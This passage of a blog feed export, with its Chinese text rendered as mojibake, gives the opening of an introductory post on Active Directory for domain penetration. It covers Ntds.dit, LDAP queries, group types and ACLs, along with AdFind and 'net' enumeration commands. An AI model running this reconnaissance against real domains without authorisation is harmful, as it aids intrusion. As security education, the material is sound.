href="#5-å…³ç³»è§„èŒƒåŒ–ç†è®º" class="headerlink" title="5.å…³ç³»è§„èŒƒåŒ–ç†è®º"></a>5.å…³ç³»è§„èŒƒåŒ–ç†è®º</h2><p>å®åœ¨æ¥ä¸åŠäº†,çœ‹çš„è¿™ä¸ªé€Ÿæˆ</p><p><a href="https://www.bilibili.com/video/BV1Bq4y1Y7GC?p=2&vd_source=3a0549a10a00b9b6b6653658bbdb92b2">https://www.bilibili.com/video/BV1Bq4y1Y7GC?p=2&vd_source&#x3D;3a0549a10a00b9b6b6653658bbdb92b2</a></p>]]></content>
      
      
      <categories>
          
          <category> å¼€å‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ•°æ®åº“ </tag>
            
            <tag> ç†è®ºè¯¾ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åŸŸæ¸—é€(ä¸€)-å†…ç½‘åŸºç¡€çŸ¥è¯†</title>
      <link href="/2023/08/30/%E5%9F%9F%E6%B8%97%E9%80%8F(%E4%B8%80)-%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
      <url>/2023/08/30/%E5%9F%9F%E6%B8%97%E9%80%8F(%E4%B8%80)-%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h1 id="å†…ç½‘åŸºç¡€çŸ¥è¯†"><a href="#å†…ç½‘åŸºç¡€çŸ¥è¯†" class="headerlink" title="å†…ç½‘åŸºç¡€çŸ¥è¯†"></a>å†…ç½‘åŸºç¡€çŸ¥è¯†</h1><h2 id="1-æ´»åŠ¨ç›®å½•-AD"><a href="#1-æ´»åŠ¨ç›®å½•-AD" class="headerlink" title="1.æ´»åŠ¨ç›®å½•(AD)"></a>1.æ´»åŠ¨ç›®å½•(AD)</h2><h3 id="1-1Ntds-ditæ–‡ä»¶"><a href="#1-1Ntds-ditæ–‡ä»¶" class="headerlink" title="1.1Ntds.ditæ–‡ä»¶"></a>1.1Ntds.ditæ–‡ä»¶</h3><ol><li>æ´»åŠ¨ç›®å½•æ˜¯å®‰è£…åœ¨åŸŸæ§ä¸Šï¼Œå­˜å‚¨äº†åŸŸå„ç§ä¿¡æ¯çš„ç»„ä»¶ã€‚</li><li>ç›®å½•æ•°æ®å­˜å‚¨åœ¨NTds.ditæ–‡ä»¶ä¸­ï¼ŒNtds.ditæ–‡ä»¶æ—¶åŸŸæ§çš„ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå…¶ä½ç½®ä¸ºâ€%SystemRoot%\ntds\ntds.ditâ€ã€‚</li><li>Ntds.ditæ–‡ä»¶ä¸­å­˜å‚¨æœ‰å…³åŸŸç”¨æˆ·ã€ç”¨æˆ·å¯†ç çš„å“ˆå¸Œæ•£åˆ—å€¼ã€ç”¨æˆ·ç»„ã€ç»„æˆå‘˜èº«ä»½å’Œç»„ç­–ç•¥ä¿¡æ¯ç­‰ã€‚</li><li>Ntds.ditæ–‡ä»¶ä½¿ç”¨å­˜å‚¨åœ¨SYSTEMæ–‡ä»¶çš„å¯†é’¥å¯¹è¿™äº›å“ˆå¸Œå€¼è¿›è¡ŒåŠ å¯†</li><li>åœ¨éåŸŸç¯å¢ƒä¸­ï¼Œç”¨æˆ·çš„ç™»é™†å‡­æ®å­˜å‚¨åœ¨SAMæ–‡ä»¶ä¸­</li></ol><h3 id="1-2ç›®å½•æœåŠ¡ä¸LDAP"><a href="#1-2ç›®å½•æœåŠ¡ä¸LDAP" class="headerlink" title="1.2ç›®å½•æœåŠ¡ä¸LDAP"></a>1.2ç›®å½•æœåŠ¡ä¸LDAP</h3><p>1.æ´»åŠ¨ç›®å½•æ˜¯ä¸€ç§ç›®å½•æœåŠ¡æ•°æ®åº“ï¼Œåˆ©ç”¨LDAPæœåŠ¡åç§°è·¯å¾„æ¥æè¿°å¯¹è±¡åœ¨æ´»åŠ¨ç›®å½•ä¸­çš„ä½ç½®ã€‚<br>2.DN:ç»å¯¹å¯è¾¨è¯†åç§°ï¼ŒæŒ‡å‘ä¸€ä¸ªLDAPå¯¹è±¡çš„å®Œæ•´è·¯å¾„<br>3.RDNï¼šç”¨äºæŒ‡å‘ä¸€ä¸ªLDAPå¯¹è±¡çš„ç›¸å¯¹è·¯å¾„<br>4.æ´»åŠ¨ç›®å½•çš„è®¿é—®:å¯ä»¥é‡Œåˆ©ç”¨å¾®è½¯å®˜æ–¹çš„AD Explorerå·¥å…·è¿æ¥åŸŸæ§åˆ¶å™¨æ¥è®¿é—®<br><a href="https://learn.microsoft.com/en-us/sysinternals/downloads/adexplorer">ä¸‹è½½é“¾æ¥</a><br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308302118006.png"><br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308302120579.png"><br>5.æ´»åŠ¨ç›®å½•åˆ†åŒº:åŸŸåˆ†åŒºã€é…ç½®åˆ†åŒºã€æ¶æ„åˆ†åŒº</p><h3 id="1-3æ´»åŠ¨ç›®å½•çš„æŸ¥è¯¢"><a href="#1-3æ´»åŠ¨ç›®å½•çš„æŸ¥è¯¢" class="headerlink" title="1.3æ´»åŠ¨ç›®å½•çš„æŸ¥è¯¢"></a>1.3æ´»åŠ¨ç›®å½•çš„æŸ¥è¯¢</h3><p>1.LDAPæŒ‰ä½æŸ¥è¯¢<br>æŒ‰ä½æŸ¥è¯¢è¯­æ³•</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;å±æ€§åç§°&gt;:&lt;BitFilterRule-ID&gt;:=&lt;åè¿›åˆ¶çš„ä½å€¼&gt;</span><br><span class="line">BitFilterRule-ID:æŸ¥è¯¢è§„åˆ™å¯¹åº”çš„ID</span><br><span class="line">åè¿›åˆ¶çš„ä½å€¼:å¯¹åº”æŸ¥è¯¢å±æ€§çš„ä½çš„åè¿›åˆ¶å€¼çš„å’Œ</span><br></pre></td></tr></table></figure><p>ä½æŸ¥è¯¢è§„åˆ™<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308302133055.png"><br>éƒ¨åˆ†å±æ€§ä¿¡æ¯<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308302134402.png"><br>ä¾‹å¦‚:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(userAccountControl:1.2.840.113556.1.4.803:=131080)</span><br><span class="line">æŸ¥è¯¢å±æ€§ä¸ºuserAccountControl</span><br><span class="line">1.2.840.113556.1.4.803 ä½æŸ¥è¯¢è§„åˆ™ä¸ºAND</span><br><span class="line">131080ä»£è¡¨æŸ¥è¯¢çš„æ˜¯HOMEDIR_REQUIRED(8)å’ŒMNS_LOGON_ACCOUN(131072)ä¸¤ä¸ªä½</span><br></pre></td></tr></table></figure><p>2.ADFindæŸ¥è¯¢æ´»åŠ¨ç›®å½•<br><a href="https://www.softpedia.com/get/Programming/Other-Programming-Files/AdFind.shtml#download">ä¸‹è½½é“¾æ¥</a><br>Adfindå¯ä»¥åœ¨åŸŸå†…ä»»ä½•ä¸€å°ä¸»æœºä¸Šç”¨,æŸ¥è¯¢è¯­æ³•ä¸º</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Adfind.exe [switches] [-b basedn] [-f filter] [attr list]</span><br><span class="line">-b æŒ‡å®šä¸€ä¸ªBaseDNä½œä¸ºæŸ¥è¯¢çš„æ ¹</span><br><span class="line">-f ä¸ºLDAPè¿‡æ»¤æ¡ä»¶</span><br><span class="line">attr list ä¸ºéœ€è¦æ˜¾ç¤ºçš„å±æ€§</span><br></pre></td></tr></table></figure><p>ä¾‹å¦‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Adfind.exe -b dc=hack-my,dc=com -f &quot;objectClass=computer&quot; name operatingSystem</span><br><span class="line">-b æŒ‡å®šæŸ¥è¯¢hack-my.comåŸŸ</span><br><span class="line">-f æŒ‡å®šæŸ¥è¯¢æ‰€æœ‰computerå¯¹è±¡</span><br><span class="line">name operatingSystem å¹¶ä¸”è¿‡æ»¤å¯¹è±¡çš„name å’ŒoperatingSystemå±æ€§</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308302146854.png"></p><p>å¸¸ç”¨æŸ¥è¯¢<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308302148133.png"><br>Adfindä¹Ÿæ”¯æŒæŒ‰ä½æŸ¥è¯¢</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Adfind.exe -b dc=hack-my, dc=com -f &quot;(userAccountControl:AND:=131080)&quot; -bit -dn</span><br></pre></td></tr></table></figure><h2 id="2-åŸŸç”¨æˆ·ä¸æœºå™¨ç”¨æˆ·ä»‹ç»"><a href="#2-åŸŸç”¨æˆ·ä¸æœºå™¨ç”¨æˆ·ä»‹ç»" class="headerlink" title="2.åŸŸç”¨æˆ·ä¸æœºå™¨ç”¨æˆ·ä»‹ç»"></a>2.åŸŸç”¨æˆ·ä¸æœºå™¨ç”¨æˆ·ä»‹ç»</h2><h3 id="2-1åŸŸç”¨æˆ·"><a href="#2-1åŸŸç”¨æˆ·" class="headerlink" title="2.1åŸŸç”¨æˆ·"></a>2.1åŸŸç”¨æˆ·</h3><p>1.åŸŸç”¨æˆ·æ˜¯åŸŸç¯å¢ƒä¸­çš„ç”¨æˆ·ï¼Œåœ¨åŸŸæ§ä¸­è¢«åˆ›å»ºï¼Œæ‰€æœ‰ä¿¡æ¯ä¿å­˜åœ¨æ´»åŠ¨ç›®å½•ä¸­<br>2.åŸŸç”¨æˆ·ä½äºå…¨å±€ç»„Domain Users<br>è®¡ç®—æœºæœ¬åœ°ç”¨æˆ·ä½äºæœ¬åœ°Userç»„ä¸­ï¼Œè®¡ç®—æœºåŠ å…¥åŸŸæ—¶ï¼Œå…¨å±€ç»„Domain Usersä¼šè¢«æ·»åŠ åˆ°è®¡ç®—æœºæœ¬åœ°Userç»„ä¸­<br>3.åœ¨ä»»ä¸€è®¡ç®—æœºä¸­æ‰§è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user /domain</span><br></pre></td></tr></table></figure><p>å¯ä»¥æŸ¥çœ‹åŸŸä¸­æ‰€æœ‰ç”¨æˆ·<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308302150542.png"></p><h3 id="2-2æœºå™¨ç”¨æˆ·"><a href="#2-2æœºå™¨ç”¨æˆ·" class="headerlink" title="2.2æœºå™¨ç”¨æˆ·"></a>2.2æœºå™¨ç”¨æˆ·</h3><p>1.æœºå™¨ç”¨æˆ·æ‹¥æœ‰åŸŸç”¨æˆ·çš„å±æ€§<br>2.åŸŸç¯å¢ƒä¸­ï¼Œè®¡ç®—æœºæœ¬åœ°ç”¨æˆ·SYSTEMå¯¹åº”åŸŸä¸­çš„æœºå™¨è´¦æˆ·ï¼Œåœ¨åŸŸä¸­çš„ç”¨æˆ·åæ˜¯ â€œæœºå™¨å+$â€<br>3.æŸ¥çœ‹åŸŸä¸­æ‰€æœ‰çš„æœºå™¨ç”¨æˆ·</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net group &quot;Domain Computers&quot; /domain</span><br></pre></td></tr></table></figure><p>4.åœ¨è·å–åŸŸä¸­ä¸»æœºæ—¶å¯èƒ½æƒé™å—é™ï¼Œæå‡åˆ°SYSTEMæƒé™å¯æ‰§è¡Œæ›´å¤šå‘½ä»¤ã€‚<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308302153209.png"></p><h2 id="3-åŸŸç”¨æˆ·ç»„çš„åˆ†ç±»å’Œæƒé™"><a href="#3-åŸŸç”¨æˆ·ç»„çš„åˆ†ç±»å’Œæƒé™" class="headerlink" title="3.åŸŸç”¨æˆ·ç»„çš„åˆ†ç±»å’Œæƒé™"></a>3.åŸŸç”¨æˆ·ç»„çš„åˆ†ç±»å’Œæƒé™</h2><p>ç»„åˆ†ä¸ºé€šè®¯ç»„å’Œå®‰å…¨ç»„ï¼Œé€šè®¯ç»„:é€šè®¯å‘æ¶ˆæ¯ï¼Œå®‰å…¨ç»„:ç”¨æˆ·æƒé™çš„é›†åˆ</p><h3 id="å®‰å…¨ç»„çš„æƒé™"><a href="#å®‰å…¨ç»„çš„æƒé™" class="headerlink" title="å®‰å…¨ç»„çš„æƒé™"></a>å®‰å…¨ç»„çš„æƒé™</h3><h4 id="1-åŸŸæœ¬åœ°ç»„"><a href="#1-åŸŸæœ¬åœ°ç»„" class="headerlink" title="1.åŸŸæœ¬åœ°ç»„"></a>1.åŸŸæœ¬åœ°ç»„</h4><p>1.åŸŸæœ¬åœ°ä¸»è¦ç”¨äºè®¿é—®åŒä¸€ä¸ªåŸŸä¸­çš„èµ„æºã€‚<br>2.é™¤äº†æœ¬ç»„çš„ç”¨æˆ·ï¼ŒåŸŸæœ¬åœ°ç»„è¿˜å¯ä»¥åŒ…å«åŸŸæ—å†…çš„ä»»ä½•ä¸€ä¸ªåŸŸå’Œé€šç”¨ç»„ã€å…¨å±€ç»„çš„ç”¨æˆ·<br>3.åŸŸæœ¬åœ°ç»„åªèƒ½å¤Ÿè®¿é—®æœ¬åŸŸä¸­çš„èµ„æºï¼Œæ— æ³•è®¿é—®å…¶ä»–ä¸åŒåŸŸä¸­çš„èµ„æº<br>4.æŸ¥è¯¢æ‰€æœ‰åŸŸæœ¬åœ°ç»„</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Adfind.exe -b &quot;dc=hack-my, dc=com&quot; -bit -f &quot;(&amp;(objectClass=group)(grouptype:AND:=4))&quot; cn -dn</span><br></pre></td></tr></table></figure><p>åŸŸæœ¬åœ°ç»„åœ¨æ´»åŠ¨ç›®å½•ä¸­éƒ½æ˜¯Groupç±»çš„å®ä¾‹,è€ŒåŸŸç»„çš„ä½œç”¨ç±»å‹æ˜¯ç”±å…¶groupTypeå±æ€§å†³å®šçš„,è¯¥å±æ€§æ˜¯ä¸€ä¸ªä½å±æ€§<br>5.å¸¸è§çš„ç³»ç»Ÿå†…ç½®çš„åŸŸæœ¬åœ°ç»„æœ‰:Administratorsç®¡ç†å‘˜ç»„,Print Operators:æ‰“å°æœºæ“ä½œç»„,Backup Operators:å¤‡ä»½æ“ä½œç»„,Remote  Desktop Users:è¿œç¨‹ç™»å½•ç»„,Account Operators è´¦å·æ“ä½œç»„,Server Operators:æœåŠ¡å™¨æ“ä½œå‘˜ç»„</p><h4 id="2-é€šç”¨ç»„"><a href="#2-é€šç”¨ç»„" class="headerlink" title="2.é€šç”¨ç»„"></a>2.é€šç”¨ç»„</h4><p>1.é€šç”¨ç»„å¯ä»¥ä½œç”¨äºåŸŸæ—çš„æ‰€æœ‰ä¸,å…¶æˆå‘˜å¯ä»¥åŒ…æ‹¬åŸŸæ—ä¸­ä»»ä½•åŸŸçš„ç”¨æˆ·è´¦æˆ·ã€å…¨å±€ç»„å’Œå…¶ä»–é€šç”¨ç»„ï¼Œä½†æ˜¯æ— æ³•åŒ…å«ä»»ä½•ä¸€ä¸ªåŸŸä¸­çš„åŸŸæœ¬åœ°ç»„<br>2.é€šç”¨ç»„å¯ä»¥åœ¨åŸŸæ—çš„ä»»ä½•åŸŸä¸­è¢«æŒ‡æ´¾è®¿é—®æƒé™ï¼Œä»¥ä¾¿è®¿é—®æ‰€æœ‰åŸŸä¸­çš„èµ„æºã€‚åŸŸç®¡ç†å‘˜è¿›è¡ŒåŸŸç®¡ç†æ—¶ï¼Œå¯ä»¥ä¸ºé€šç”¨ç»„æˆäºˆå¯¹åŸŸæ—ä¸­æ‰€æœ‰åŸŸçš„èµ„æºè®¿é—®æƒé™ï¼Œè€Œä¸æƒ³éœ€è¦è€ƒè™‘æ­¤é€šç”¨ç»„æ‰€åœ¨çš„ä½ç½®<br>3.æŸ¥è¯¢å¯»æ‰€æœ‰çš„é€šç”¨ç»„</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Adfind.exe -b dc=hack-my,dc=com -bit -f &quot;(&amp;(objectClass=group)(grouptype:AND:=8))&quot; cn -dn</span><br></pre></td></tr></table></figure><p>4.å¸¸è§çš„ç³»ç»Ÿå†…ç½®é€šç”¨ç»„<br>Enterprise Admins:ç»„ç»‡ç³»ç»Ÿç®¡ç†å‘˜ç»„,è¯¥ç»„ä¸­çš„æˆå‘˜åœ¨åŸŸæ—æ¯ä¸ªåŸŸä¸­éƒ½æ˜¯Administratorsç»„çš„æƒé™<br>Schema Admins:æ¶æ„ç®¡ç†å‘˜ç»„,è¯¥ç»„ä¸­çš„æˆå‘˜å¯ä»¥ä¿®æ”¹æ´»åŠ¨ç›®å½•,å¦‚åœ¨æ¶æ„åˆ†åŒºä¸­æ–°å¢ç±»æˆ–å±æ€§</p><h4 id="3-å…¨å±€ç»„"><a href="#3-å…¨å±€ç»„" class="headerlink" title="3.å…¨å±€ç»„"></a>3.å…¨å±€ç»„</h4><p>1.å…¨å±€ç»„å¯ä»¥ä½œç”¨äºåŸŸæ—çš„æ‰€æœ‰åŸŸ,æ˜¯ä»‹äºåŸŸæœ¬åœ°ç»„å’Œé€šç”¨ç»„çš„ç»„<br>2.å…¨å±€ç»„åªèƒ½åŒ…å«æœ¬åŸŸçš„ç”¨æˆ·<br>3.å…¨å±€ç»„å¯ä»¥åµŒå¥—åœ¨åŒä¸€ä¸ªåŸŸçš„å¦ä¸€ä¸ªå…¨å±€ç»„ä¸­,ä¹Ÿå¯ä»¥åµŒå¥—åœ¨å…¶ä»–åŸŸçš„é€šç”¨ç»„æˆ–æœ¬åœ°ç»„ä¸­<br>4.å…¨å±€ç»„å¯ä»¥åœ¨åŸŸæ—çš„ä»»ä½•åŸŸä¸­è¢«æŒ‡æ´¾è®¿é—®æƒé™<br>5.æŸ¥è¯¢æ‰€æœ‰çš„å…¨å±€ç»„</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Adfind.exe -b &quot;dc=hack-my,dc=com&quot; -bit -f &quot;(&amp;(objectClass=group)(grouptype:AND:=2))&quot; cn -dn</span><br></pre></td></tr></table></figure><p>6.å¸¸è§çš„ç³»ç»Ÿå†…ç½®çš„å…¨å±€ç»„:<br>Domain Admins:åŸŸç®¡ç†å‘˜ç»„<br>Domain Users:åŸŸç”¨æˆ·ç»„<br>Domain Computers:åŸŸæˆå‘˜ä¸»æœºç»„</p><h2 id="4-ç»„ç»‡å•ä½"><a href="#4-ç»„ç»‡å•ä½" class="headerlink" title="4.ç»„ç»‡å•ä½"></a>4.ç»„ç»‡å•ä½</h2><p>1.ç»„ç»‡å•ä½æ˜¯ä¸€ä¸ªå¯ä»¥å°†åŸŸä¸­çš„ç”¨æˆ·ã€ç»„ã€è®¡ç®—æœºç­‰å¯¹è±¡æ”¾å…¥å…¶ä¸­çš„å®¹å™¨å¯¹è±¡ï¼Œæ˜¯å¯ä»¥æŒ‡æ´¾ç»„ç­–ç•¥æˆ–å§”æ´¾ç®¡ç†æƒé™çš„æœ€å°ä½œç”¨åŸŸæˆ–å•å…ƒã€‚<br>2.ç»„ç»‡å•ä½å¯ä»¥ç»Ÿä¸€ç®¡ç†ç»„ç»‡å•ä½ä¸­çš„åŸŸå¯¹è±¡ï¼ŒåŒ…æ‹¬ä¸”ä¸é™äºï¼šç”¨æˆ·ã€è®¡ç®—æœºã€å·¥ä½œç»„ã€æ‰“å°æœºã€å®‰å…¨ç­–ç•¥ç­‰<br>3.åœ¨ç»„ç»‡åŸŸç¯å¢ƒä¸­ç»å¸¸å¯ä»¥çœ‹åˆ°æŒ‰ç…§éƒ¨é—¨åˆ’åˆ†çš„ä¸€ä¸ªä¸ªç»„ç»‡å•ä½<br>4.æ‰€æœ‰ç»„ç»‡å•ä½åœ¨æ´»åŠ¨ç›®å½•ä¸­éƒ½æ˜¯organizationUnitç±»çš„å®ä¾‹,å¯ä»¥é€šè¿‡</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(objectClass=organizationalUnit)</span><br><span class="line">(objectCategory=organizationalUnit)</span><br></pre></td></tr></table></figure><p>æ¥æŸ¥è¯¢æ‰€æœ‰çš„OU</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Adfind.exe -b &quot;dc=hack-my,dc=com&quot; -f &quot;(objectClass=organizationalUnit)&quot; -dn</span><br></pre></td></tr></table></figure><p>å°†BaseDNè®¾å®šä¸ºæŒ‡å®šçš„ç»„ç»‡å•å…ƒï¼Œä¾¿å¯ä»¥æŸ¥è¯¢å…¶ä¸­æŒ‡å®šçš„å¯¹è±¡</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Adfind.exe -b &quot;OU=ç§‘ç ”ä¸­å¿ƒ, DC=hack-my, DC=com&quot; -dn</span><br></pre></td></tr></table></figure><h2 id="5-è®¿é—®æ§åˆ¶"><a href="#5-è®¿é—®æ§åˆ¶" class="headerlink" title="5.è®¿é—®æ§åˆ¶"></a>5.è®¿é—®æ§åˆ¶</h2><p>1.è®¿é—®æ§åˆ¶æ˜¯Windowsæ“ä½œç³»ç»Ÿä½¿ç”¨å†…ç½®æˆæƒå’Œè®¿é—®æ§åˆ¶æŠ€æœ¯ï¼Œç¡®å®šç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·æ˜¯å¦å…·æœ‰è®¿é—®èµ„æºçš„æ­£ç¡®æƒé™ï¼Œä»¥æ§åˆ¶ä¸»ä½“æ“ä½œå¯¹è±¡çš„è¡Œä¸ºæ˜¯å¦å…·æœ‰åˆæ³•æƒé™</p><p>2.Windowsä¸­ï¼Œè®¿é—®ä¸»é¢˜é€šå¸¸æŒ‡å®‰å…¨ä¸»ä½“ã€‚å®‰å…¨ä¸»ä½“æ˜¯ä»»ä½•å¯é€šè¿‡æ“ä½œç³»ç»Ÿè¿›è¡Œèº«ä»½éªŒè¯çš„å®ä½“ï¼Œå¦‚ç”¨æˆ·è´¦æˆ·ï¼Œè®¡ç®—æœºè´¦æˆ·ç­‰ã€‚è¢«è®¿é—®çš„å¯¹è±¡é€šå¸¸æŒ‡å®‰å…¨å¯¹è±¡ï¼Œå¯èƒ½æ˜¯æ–‡ä»¶ã€æ–‡ä»¶å¤¹ã€æ³¨å†Œè¡¨é¡¹ç­‰ã€‚</p><p>3.å½“ç»è¿‡èº«ä»½éªŒè¯ï¼ŒWindowsä¼šä¸ºå®‰å…¨ä¸»é¢˜åˆ›å»ºä¸€ä¸ªè®¿é—®ä»¤ç‰Œï¼Œå…¶ä¸­åŒ…å«éªŒè¯è¿‡ç¨‹è¿”å›çš„SIDå’Œæœ¬åœ°å®‰å…¨ç­–ç•¥åˆ†é…ç»™ç”¨æˆ·çš„ç”¨æˆ·æƒé™åˆ—è¡¨ã€‚</p><p>4.å½“å®‰å…¨å¯¹è±¡è¢«åˆ›å»ºæ—¶ï¼ŒWindowsä¼šä¸ºå…¶åˆ›å»ºä¸€ä¸ªå®‰å…¨æè¿°ç¬¦ï¼ŒWindowsçš„è®¿é—®æ§åˆ¶æ­£å¼å°†å®‰å…¨ä¸»ä½“çš„è®¿é—®ä»¤ç‰Œä¸­çš„ä¿¡æ¯äºå®‰å…¨å¯¹è±¡çš„å®‰å…¨æè¿°ä¸­çš„è®¿é—®æ§åˆ¶é¡¹è¿›è¡Œæ¯”è¾ƒåšå‡ºè®¿é—®å†³ç­–çš„ã€‚</p><h3 id="1-Windowsè®¿é—®æ§åˆ¶æ¨¡å‹"><a href="#1-Windowsè®¿é—®æ§åˆ¶æ¨¡å‹" class="headerlink" title="1.Windowsè®¿é—®æ§åˆ¶æ¨¡å‹"></a>1.Windowsè®¿é—®æ§åˆ¶æ¨¡å‹</h3><h4 id="1-1è®¿é—®ä»¤ç‰Œ"><a href="#1-1è®¿é—®ä»¤ç‰Œ" class="headerlink" title="1.1è®¿é—®ä»¤ç‰Œ"></a>1.1è®¿é—®ä»¤ç‰Œ</h4><p>ç”¨æˆ·ç™»å½•æ—¶ï¼ŒWindowså¯¹ç”¨æˆ·èº«ä»½è¿›è¡ŒéªŒè¯ï¼ŒéªŒè¯é€šè¿‡ä¸ºç”¨æˆ·åˆ›å»ºä¸€ä¸ªè®¿é—®ä»¤ç‰Œã€‚è¯¥ä»¤ç‰ŒåŒ…æ‹¬ç™»å½•è¿‡ç¨‹è¿”å›çš„SIDã€ç”±æœ¬åœ°å®‰å…¨ç­–ç•¥åˆ†é…ç»™ç”¨æˆ·å’Œç”¨æˆ·æ‰€å±å®‰å…¨ç»„çš„ç‰¹æƒåˆ—è¡¨</p><p>è®¿é—®ä»¤ç‰Œä¸»è¦åŒ…å«ä¿¡æ¯:<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308302344914.png"></p><h4 id="1-2å®‰å…¨æè¿°ç¬¦"><a href="#1-2å®‰å…¨æè¿°ç¬¦" class="headerlink" title="1.2å®‰å…¨æè¿°ç¬¦"></a>1.2å®‰å…¨æè¿°ç¬¦</h4><p>1.å®‰å…¨æè¿°ç¬¦æ˜¯ä¸€ç§ä¸æ¯ä¸ªå®‰å…¨å¯¹è±¡ç›¸å…³è”çš„æ•°æ®ç»“æ„ï¼Œå…¶ä¸­åŒ…å«ä¸å®‰å…¨å¯¹è±¡ç›¸å…³è”çš„å®‰å…¨ä¿¡æ¯ã€‚<br>2.å®‰å…¨å¯¹è±¡è¢«åˆ›å»ºæ—¶ï¼Œæ“ä½œç³»ç»Ÿä¼šä¸ºå…¶åˆ›å»ºä¸€ä¸ªå®‰å…¨æè¿°ç¬¦ã€‚<br>3.å®‰å…¨æè¿°ç¬¦ä¸»è¦æœ‰SIDå’ŒACLç»„æˆã€‚SIDç”¨æ¥è¡¨ç¤ºç”¨æˆ·è´¦æˆ·å’Œè¯¥ç”¨æˆ·æ‰€å±çš„ç»„,ACL(è®¿é—®æ§åˆ¶åˆ—è¡¨)åˆ†ä¸ºDACLå’ŒSACLä¸¤ç§ã€‚</p><h3 id="2-è®¿é—®æ§åˆ¶åˆ—è¡¨"><a href="#2-è®¿é—®æ§åˆ¶åˆ—è¡¨" class="headerlink" title="2.è®¿é—®æ§åˆ¶åˆ—è¡¨"></a>2.è®¿é—®æ§åˆ¶åˆ—è¡¨</h3><p>ACLæ˜¯è®¿é—®æ§åˆ¶é¡¹(ACE)çš„åˆ—è¡¨, æ¯ä¸ªè®¿é—®æ§åˆ¶é¡¹åˆ¶å®šäº†ä¸€ç³»åˆ—è®¿é—®æƒé™ã€‚</p><p>å‡è®¾æœ‰å®‰å…¨ä¸»ä½“Aå’Œå®‰å…¨å¯¹è±¡B, å½“Aè®¿é—®B,Aä¼šå‡ºç¤ºè‡ªå·±çš„è®¿é—®ä»¤ç‰Œ,å…¶ä¸­åŒ…å«è‡ªå·±çš„ç”¨æˆ·SID,æ‰€å±ç”¨æˆ·ç»„çš„SIDå’Œç‰¹æƒåˆ—è¡¨ã€‚<br>å®‰å…¨å¯¹è±¡Bæœ‰è‡ªå·±çš„è®¿é—®æ§åˆ¶åˆ—è¡¨,ä¼šå…ˆåˆ¤æ–­è‡ªå·±æ˜¯ä¸æ˜¯éœ€è¦ç‰¹æƒæ‰èƒ½è®¿é—®,å¦‚æœéœ€è¦ç‰¹æƒ,å°±æ ¹æ®å®‰å…¨ä¸»ä½“Açš„è®¿é—®ä»¤ç‰ŒæŸ¥çœ‹è‡ªå·±æ˜¯å¦å…·æœ‰è¯¥ç‰¹æƒã€‚ç„¶åå®‰å…¨å¯¹è±¡Bå°†å®‰å…¨ä¸»ä½“Açš„è®¿é—®ä»¤ç‰Œä¸è‡ªå·±çš„è®¿é—®æ§åˆ¶åˆ—è¡¨æ¯”å¯¹ï¼Œå¹¶å†³å®šæ˜¯å¦è®©Aè®¿é—®ã€‚</p><p>æ­¤è¿‡ç¨‹ä¸­ï¼Œè®¿é—®æ§åˆ¶åˆ—è¡¨ä¸»è¦çš„ä¸¤ä¸ªä½œç”¨: 1.è¿›è¡Œè®¿é—®æƒé™æ§åˆ¶,åˆ¤æ–­å®‰å…¨ä¸»ä½“èƒ½ä¸èƒ½è®¿é—®è¯¥å®‰å…¨å¯¹è±¡ã€‚<br>2.æ—¥å¿—è®°å½•åŠŸèƒ½,å¯¹ç”¨æˆ·è®¿é—®è¡Œä¸ºçš„æˆåŠŸä¸å¦è¿›è¡Œæ—¥å¿—è®°å½•ã€‚</p><h4 id="2-1-DACL"><a href="#2-1-DACL" class="headerlink" title="2.1 DACL"></a>2.1 DACL</h4><p>1.DACL(è‡ªä¸»è®¿é—®æ§åˆ¶åˆ—è¡¨)æ˜¯å®‰å…¨å¯¹è±¡çš„è®¿é—®æ§åˆ¶ç­–ç•¥,å…¶ä¸­å®šä¹‰äº†è¯¥å®‰å…¨å¯¹è±¡çš„è®¿é—®æ§åˆ¶ç­–ç•¥,ç”¨äºæŒ‡å®šå…è®¸æˆ–æ‹’ç»ç‰¹å®šå®‰å…¨ä¸»ä½“å¯¹è¯¥å®‰å…¨å¯¹è±¡çš„è®¿é—®ã€‚<br>2.DACLæ˜¯ç”±ä¸€æ¡æ¡çš„è®¿é—®æ§åˆ¶é¡¹ACEæ¡ç›®æ„æˆçš„,æ¯æ¡ACEå®šä¹‰äº†å“ªäº›ç”¨æˆ·æˆ–ç»„é˜Ÿè¯¥å¯¹è±¡æ‹¥æœ‰æ€æ ·çš„è®¿é—®æƒé™ã€‚æ¯ä¸ªACEæŒ‡å®šäº†ä¸€ç»„è®¿é—®æƒé™ï¼Œå¹¶åŒ…å«ä¸€ä¸ªSIDã€‚è¯¥SIDæ 